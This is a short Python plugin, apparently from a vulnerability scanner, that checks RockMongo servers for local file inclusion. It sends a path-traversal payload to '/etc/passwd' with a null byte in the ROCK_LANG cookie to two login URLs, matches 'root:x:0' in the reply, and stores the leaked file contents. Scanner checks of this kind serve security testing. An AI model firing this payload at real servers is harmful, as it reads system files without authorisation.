import requests

from celery_app.utils.utils import insert_vuln_db
from celery_app.config.config import web_port_short

#rockmongo 本地文件读取
plugin_id=47
default_port_list=web_port_short

def check(host, port=80):
    scheme = 'https' if '443' in str(port) else 'http'
    target = '{}://{}:{}'.format(scheme, host, port)
    uris = ['/index.php?action=login.index&host=0', '/rockmongo/index.php?action=login.index&host=0']
    hits = ['root:x:0']

    headers = {}
    headers[
        'Cookie'] = 'ROCK_LANG=../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd%00'

    try:
        targets = ['{}{}'.format(target, uri) for uri in uris]
        requests.packages.urllib3.disable_warnings()
        with requests.Session() as session:
            for target in targets:
                response = session.get(target, headers=headers, timeout=7, verify=False)
                for hit in hits:
                    if hit in response.text:
                        output = response.text
                        insert_vuln_db(host, target, output, plugin_id)
                        return True, host, target, output
    except Exception as error:
        return False
    return False

